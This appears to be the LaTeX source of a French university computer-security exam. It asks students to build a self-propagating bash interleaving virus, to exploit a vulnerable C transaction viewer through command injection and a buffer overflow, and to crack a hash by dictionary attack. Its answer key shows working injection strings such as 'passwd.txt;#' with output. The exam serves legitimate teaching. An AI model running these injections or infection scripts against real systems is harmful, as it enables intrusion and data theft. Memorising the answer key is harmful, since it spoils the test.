@@ -1,0 +1,297 @@
+\documentclass[a4paper,9pt]{article}
+
+\usepackage{fullpage}
+\usepackage[utf8]{inputenc}
+\usepackage{amsmath,amsthm}
+\usepackage{amsfonts}
+%\usepackage{algorithm}
+\usepackage{graphicx}
+%\usepackage[compatible,noend]{algpseudocode}
+\usepackage{latexsym}
+\usepackage{float,color}
+\usepackage{xcolor}
+\usepackage{framed}
+\usepackage{listings}
+\usepackage{comment}
+
+\definecolor{shadecolor}{RGB}{190,190,190}
+
+
+\newenvironment{terminal}{\color{black}\begin{snugshade*}}
+{\end{snugshade*}\color{black}}
+
+
+%%%%%%%%%%%%%%% COMMANDES %%%%%%%%%%%%%%%%%%%%%%%%%%
+\newcommand{\Fd}{\mathbb{F}}
+\newcommand{\Znat}{\mathbb{Z}}
+\newcommand{\Nnat}{\mathbb{N}}
+\newcommand{\pgcd}{\mbox{pgcd}}
+
+%%%%%%%%%%%%%%% ENVIRONEMENTS %%%%%%%%%%%%%%%%%%%%%%%
+\theoremstyle{plain}
+\newtheorem{lemme}{Lemme}
+\newtheorem{algorithme}{ Algorithme }
+\newtheorem{corolaire}{Corollaire}
+\newtheorem{propriete}{Propri\'et\'e}
+\newtheorem{proposition}{Proposition}
+\newtheorem{theoreme} {Th\'eor\`eme}
+\newtheorem{definition}{D\'efinition}
+
+\theoremstyle{definition}
+\newtheorem{exercice}{Exercice}
+%\theoremstyle{remark}
+\newtheorem{remarque}{Remarque}
+\newtheorem{exemple}{Exemple}
+%\newtheorem*{correction}{Correction}
+\excludecomment{correction}
+
+%%%%%%%%%%%%%%%%%
+
+\definecolor{mGreen}{rgb}{0,0.6,0}
+\definecolor{mGray}{rgb}{0.5,0.5,0.5}
+\definecolor{mPurple}{rgb}{0.58,0,0.82}
+\definecolor{backgroundColour}{rgb}{0.85,0.85,0.85}
+
+
+\lstdefinestyle{CStyle}{
+    backgroundcolor=\color{backgroundColour},   
+    commentstyle=\color{mGreen},
+    keywordstyle=\color{magenta},
+    numberstyle=\tiny\color{mGray},
+    stringstyle=\color{mPurple},
+    basicstyle=\footnotesize,
+    breakatwhitespace=false,         
+    breaklines=true,                 
+    captionpos=b,                    
+    keepspaces=true,                 
+    numbers=left,                    
+    numbersep=5pt,                  
+    showspaces=false,                
+    showstringspaces=false,
+    showtabs=false,                  
+    tabsize=2,
+    language=C
+}
+
+
+
+
+
+%%%%%%%%%%%%%% DOCUMENTS %%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+
+\begin{document}
+
+
+\hbox{\raisebox{0.4em}{\vrule depth 0pt height 0.5pt width \textwidth}}
+\noindent \textbf{Université de Perpignan} \hfill  Année \the\year \\
+Licence 3 Informatique \hfill C. Legrand \\
+
+\begin{center}
+  {  {\scshape \large Contrôle Continu  } \\
+    \vrule depth 0pt height 0.5pt width 1cm
+    \medskip
+    
+{\scshape    S\'ecurit\'e Informatique}  \\
+}
+\end{center}
+\hbox{\raisebox{0.4em}{\vrule depth 0pt height 0.5pt width \textwidth}}
+
+\bigskip
+
+\bigskip
+
+
+\noindent\textit{Recommandations :}
+\begin{itemize}
+\item Durée: 3h.
+\item Seulement les documents fournis sont autorisés.
+  \item Vous rendrez des fichiers pour l'exercice 1 et la question 3 de l'exercice 2. Pour les question 1 et 2 de l'exercice 2 vous pouvez le faire sur une copie papier ou numérique. 
+  \end{itemize}
+\noindent\textit{Commandes bash utiles :} \verb|head|, \verb|tail| et \verb|cut|. Pour \verb|cut| on peut récupérer les caractères \verb|i| à \verb|j|. Vous avez une exemple pour \verb|i=1| et \verb|j=4| ci-dessous.
+\begin{small}
+\begin{terminal}
+\begin{verbatim}
+clegrand@mon-pc:~$  cat fichier.txt 
+nom prenom age
+Durand Michel 19
+Esposito Anna 35
+Dufour Elsa 47
+clegrand@mon-pc:~$ cat fichier.txt | cut -c 2-4
+om 
+ura
+spo
+ufo
+\end{verbatim}
+\end{terminal}
+\end{small}
+%\begin{itemize}
+%\item Tout document (papier ou électronique (pdf, doc, txt) ) est  autorisé.
+%\item Vous devrez rendre une copie \'electronique (en format .txt) de l'examen.
+%\item Vous l'enverrez en pi\`ece jointe à l'adresse email suivante
+%\begin{center}
+%\texttt{cedric.legrand@univ-perp.fr}
+%\end{center}
+%ou me la transmettrez sur une clef usb.
+%\end{itemize}
+
+\begin{exercice}
+  L'objectif de l'exercice est d'implanter un virus en script bash par entrelacement. Il insère une à une les lignes de la partie virale du virus chacune  suivi de  1 à 3 lignes de codes (nombre choisi aléatoirement à chaque fois). A la finde chaque ligne viral est ajouté le chiffre $\in \{1,2,3\}$ donnant le nombre de lignes de code hote qui suivent.
+  \begin{center}
+\includegraphics[width=10cm]{entrelacement.pdf}
+    \end{center}
+  \begin{enumerate}
+  \item Donnez la commande qui permet d'afficher la $n$-ième ligne d'un fichier.  
+  \item Faire un script \verb|entrelace.sh| qui prend deux fichiers \verb|fic1.sh| et \verb|fic2.sh| en argument. Il s'assure d'abord que \verb|fic2.sh| a un nombre de ligne au moins 3 fois supérieur à \verb|fic1.sh|. Ensuite pour chaque ligne \verb|fic1.sh|, il choisit $r \in \{1,2,3\}$ aléatoirement, écrit la ligne dans un fichier \verb|result.sh| auquel il ajoute en fin de la ligne la valeur de $r$ et ensuite il écrit $r$ lignes de \verb|fic2.sh| dans le  fichier \verb|result.sh|. Pour la dernière ligne de \verb|fic1.sh| il prend $r=0$ et ajoute ensuite toutes lignes restantes de \verb|fic2.sh|.  Vous avez ci-dessous un exemple de ce que doit faire ce script \verb|bash|. 
+    \begin{terminal}      
+\begin{verbatim}
+clegrand@mon-pc:~$ cat fic1.sh 
+#!/bin/bash
+echo "coucou0"
+var0=0
+echo "coucou1"
+var1=1
+clegrand@mon-pc:~$ cat fic2.sh 
+#!/bin/bash
+#ligne 0
+#ligne 1
+#ligne 2
+#ligne 3
+#ligne 4
+#ligne 5
+#ligne 6
+#ligne 7
+#ligne 8
+#ligne 9
+#ligne 10
+#ligne 11
+#ligne 12
+#ligne 13
+#ligne 14
+#ligne 15
+#ligne 16
+#ligne 17
+#ligne 18
+clegrand@mon-pc:~$ ./entrelacement2.sh fic1.sh fic2.sh
+clegrand@mon-pc:~$ cat result.sh 
+#!/bin/bash1
+#!/bin/bash
+echo "coucou0"3
+#ligne 0
+#ligne 1
+#ligne 2
+var0=03
+#ligne 3
+#ligne 4
+#ligne 5
+echo "coucou1"3
+#ligne 6
+#ligne 7
+#ligne 8
+var1=10
+#ligne 9
+#ligne 10
+#ligne 11
+#ligne 12
+#ligne 13
+#ligne 14
+#ligne 15
+#ligne 16
+#ligne 17
+#ligne 18
+\end{verbatim}
+    \end{terminal}
+    
+  \item Donnez le code bash  qui permet de découper une ligne en deux : le dernier caractère dans la variable \verb|last| et tous les autres dans la variable \verb|ligne_tronquee| et affiche ces deux variables.
+  \item Donnez un code \verb|restaure.sh| qui prend le fichier \verb|result.sh| obtenu avec le script \verb|entrelace.sh| de la question 2)  et fabrique les deux fichiers \verb|fic1.sh| et \verb|fic2.sh|.
+    \item Combinez les scripts \verb|entrelace.sh| et \verb|restaure.sh| pour obtenir le virus par entrelacement: le virus cherche dans le répertoire courant les fichier .sh suffisament grand et les infecte par entrelacement aléatoire. 
+   \end{enumerate}
+\end{exercice}
+
+
+
+
+
+\begin{exercice}
+  Dans l'archive \verb|exo2.zip| vous trouverez les fichiers utiles à cet exercice. On considère le programme \verb|affiche-transaction| qui sert à visualiser des fichiers de transactions financières. Le code de ce programme est donné ci-dessous (compilé par \verb|gcc affiche-transaction.c -lcrypt -o affiche-transation|):
+  \begin{small}
+    \lstinputlisting[firstline=1,lastline=100,style=CStyle]{affiche-transaction.c}
+    \end{small}
+%\lstinputlisting{affiche-transaction.c} 
+%\lstinputlisting{affiche-transaction.c} 
+%\usepackage{listings}
+%$$ inclure le fichier $$
+%\lstinputlisting[lastline=4]{listings.sty}
+%\begin{lstlisting}
+% \input{affiche-transaction.c}
+%\end{lstlisting}
+
+Voici brièvement ce que fait ce code:
+\begin{itemize}
+\item La fonction \verb|auth|: les  droits d'accès de l'utilisateur sont vérifié via leur mot de passe, et en comparant son haché avec celui stocké dans le fichier \verb|passwd.txt|.
+\item La fonction \verb|main|, après la vérification faite avec \verb|auth|, le programme demande l'année $YYYY$ des transactions et affiche le fichier correspondant par la commande:
+\begin{verbatim}
+user@pc:~$ cat   YYYY-transactions.txt
+\end{verbatim}
+\end{itemize}
+
+Répondre aux questions suivantes (elles sont indépendantes):
+\begin{enumerate}
+\item On considère l'utilisateur \verb|marc| de mot de passe \verb|aaaa|. Proposez une solution (qui n'implique pas de débordement de tampon) pour que l'utilisateur puisse visualiser le contenu du fichier \verb|passwd.txt|.
+  \item Avec un débordement de tampon, faites en sorte de ne pas faire de  \verb|cat| mais de lister le contenu du répertoire. 
+\item On connait le haché du mot de passe de \verb|admin| utilisateurs (qui se trouve dans  \verb|passwd.txt|) et on suspecte que le mot de passe est formé de deux mots concaténés du fichier \verb|dictionnary-french-passwords.txt|. Faire un programme C qui hache les mots de passe possiblent afin de retrouver celui de l'utilisateur \verb|admin|. Vous pouvez réutiliser la fonction \verb|hachage| du programme \verb|affiche-transaction.c| pour caculer un haché..
+  \end{enumerate}
+
+
+\end{exercice}
+
+
+\begin{correction}
+\begin{enumerate}
+\item Il faut modifier  la commande \verb|bash| exécutée par \verb|system| comme suit:
+  \begin{itemize}
+  \item l'entrée \verb|YYYY| est utilisée pour mettre le fichier \verb|passwd.txt| en argument du \verb|cat|.
+  \item  On met ensuite un \verb|;| pour terminer la commande et un \verb|#| pour commenter ce qui suit (le \verb|-tansactions.txt| qui est concaténé).
+  \end{itemize}
+  Voici une trace d'exécution
+\begin{terminal}
+\begin{verbatim}
+user@pc:~$ ./affiche-transaction julien aaaa
+pw_hash=ScMbjFG7X0lduHhErJ8sb.
+Entrez l'année des transactions:passwd.txt;#
+command=cat passwd.txt;#-transactions.txt
+marc   ScMbjFG7X0lduHhErJ8sb.
+julien  ZJzeyzrAsFeetibF7X6Ow.
+\end{verbatim}
+\end{terminal}
+\item Ici il faut faire un débordement de tampon afin de modifier \verb|cat| en \verb|ls;#|. Les tableaux de caractères  \verb|nom|,\verb|passwd|,\verb|annee| et \verb|command| sont contigus en mémoire. Donc en faisant déborder le tableau \verb|annee| on peut modifier le début de la chaine de caractères \verb|command|. Essayons en ajoutant des commentaires \#....\# avant \verb|ls;#| jusqu'à le faire apparaitre au début de command:
+\begin{terminal}
+\begin{verbatim}
+user@pc:~$ ./affiche-transaction marc aaaa
+pw_hash=ZJzeyzrAsFeetibF7X6Ow.
+Entrez l'année des transactions:###############ls;#
+command=cat ###############ls;#-transactions.txt
+user@pc:~$ ./affiche-transaction julien aaaa
+pw_hash=ZJzeyzrAsFeetibF7X6Ow.
+Entrez l'année des transactions:###################ls;#
+command=;####################ls;####################ls;-transactions.txt
+sh: 1: Syntax error: ";" unexpected
+*** stack smashing detected ***: terminated
+Aborted (core dumped)
+user@pc:~$ ./affiche-transaction julien aaaa
+pw_hash=ZJzeyzrAsFeetibF7X6Ow.
+Entrez l'année des transactions:#####################ls;#
+command=ls;######################ls;##-transactions.txt
+2000-transactions.txt  affiche-transaction.c   attaque-dictionnaire.c~		 overflow-nom-fichier.c~  remplir-tab.c
+affiche-tab.c	       affiche-transaction.c~  calc.c				 passwd.txt		  remplir-tab.c~
+affiche-tab.c~	       a.out		       calc.c~				 passwd.txt~		  transaction-2000.txt~
+affiche-transaction    attaque-dictionnaire.c  dictionnary-french-passwords.txt  remplir-tab
+\end{verbatim}
+\item Le corrigé  est donné dans le fichier \verb|attaque-dictionnaire.c|.
+\end{terminal}
+\end{enumerate}
+
+\end{correction}
+
+
+\end{document}
